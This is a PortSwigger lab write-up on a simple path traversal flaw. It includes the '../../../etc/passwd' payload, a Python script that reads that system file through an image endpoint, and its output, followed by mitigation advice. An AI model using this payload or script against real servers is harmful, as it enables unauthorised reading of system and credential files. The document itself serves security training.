# PortSwigger Web Security Academy: File Path Traversal, Simple Case

**Category:** Server-side vulnerabilities > Path traversal
**Difficulty:** Apprentice
**Tools:** Python 3, `requests`

---

## 1. What Is the Vulnerability?

Path traversal (also called directory traversal) happens when an application takes a file name from the user and appends it to a file system path without validating it. An attacker can use `../` sequences to climb out of the intended directory and read arbitrary files on the server.

## 2. Lab Summary

Product images in the lab are loaded like this:

```
GET /image?filename=<file_name>
```

The application appends the `filename` value to `/var/www/images/` with no filtering and reads the file. The goal is to read `/etc/passwd`.

## 3. How I Found It

1. I inspected the request that loads a product image on the home page.
2. I noticed the image is served by the `/image?filename=...` endpoint, using a file name parameter.
3. Since the file name comes from the user and goes straight to the file system, I marked it as a good candidate for a traversal test.

## 4. Exploitation

Payload:

```
../../../etc/passwd
```

The application resolves the path like this:

```
/var/www/images/../../../etc/passwd  ->  /etc/passwd
```

### Script

```python
import requests

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"

def fetch(path_param):
    url = f"{TARGET}/image"
    params = {"filename": path_param}
    resp = requests.get(url, params=params)
    return resp

def main():
    # Simple traversal attempt
    payload = "../../../etc/passwd"
    resp = fetch(payload)

    print(f"Status: {resp.status_code}")
    if resp.status_code == 200 and "root:" in resp.text:
        print("[+] Success! Contents of /etc/passwd:\n")
        print(resp.text)
    else:
        print("[-] Failed, response:")
        print(resp.text[:500])

if __name__ == "__main__":
    main()
```

**How the script works:** it sends the payload in the `filename` parameter. If the response status is 200 and the body contains `root:`, `/etc/passwd` was read successfully.

> Note: the lab ID changes every session, so `TARGET` needs to be updated each time.

## 5. Proof

**Terminal output:**

```
$ python3 exploit.py
Status: 200
[+] Success! Contents of /etc/passwd:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
...
```

**Lab status:** the PortSwigger lab page displayed "Congratulations, you solved the lab!" and the `LAB Solved` badge.

**Raw HTTP request/response** (as sent by the script, via `python-requests`):

```http
GET /image?filename=../../../etc/passwd HTTP/1.1
Host: 0a2800fd03fd62dd8020992b00c80049.web-security-academy.net
User-Agent: python-requests/2.x
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

```http
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Length: <size>

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

> Note: this is the request the script actually sends (Python's `requests` library fills in these default headers). For a browser-based PoC, the same request can be reproduced in Burp Repeater or the browser's dev tools Network tab, which is the format most bug bounty programs expect in a report.

## 6. Mitigation

- Avoid passing user input to file system APIs at all where possible; map files to an ID or use a whitelist instead.
- If user input is required, **canonicalize** the path (normalize it to the real absolute path) and verify the result stays inside the allowed base directory.
- Blocking `../`, `..\` or null bytes alone is not enough, since encoded variations can bypass it. The real protection is canonicalization plus a base directory check.
- Run the application with a low-privileged user.

## 7. Key Takeaways

- Any parameter that takes a file name is a candidate for path traversal.
- This lab is the simplest case; the other labs teach filter bypasses (absolute paths, `....//`, double URL encoding, null bytes).
- Testing with a script lets me try many payloads quickly, which is a useful habit for bug bounty work too.

## 8. Next Step

Put the payloads used in the other path traversal labs into a list and extend the script to loop through them.
